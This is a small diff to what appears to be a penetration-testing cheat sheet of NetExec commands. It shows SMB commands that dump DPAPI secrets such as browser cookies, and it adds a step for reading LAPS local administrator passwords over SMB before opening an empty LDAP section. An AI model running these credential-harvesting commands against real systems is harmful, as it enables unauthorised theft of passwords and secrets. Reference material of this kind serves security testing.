@@ -60,3 +60,9 @@ SMB
   nxc smb <ip> -u user -p password --dpapi cookies
   nxc smb <ip> -u user -p password --dpapi nosystem
   nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
+20. You can also try pwning LAPS via SMB.
+  nxc smb <ip> -u user-can-read-laps -p pass --laps
+
+LDAP
+
+1.
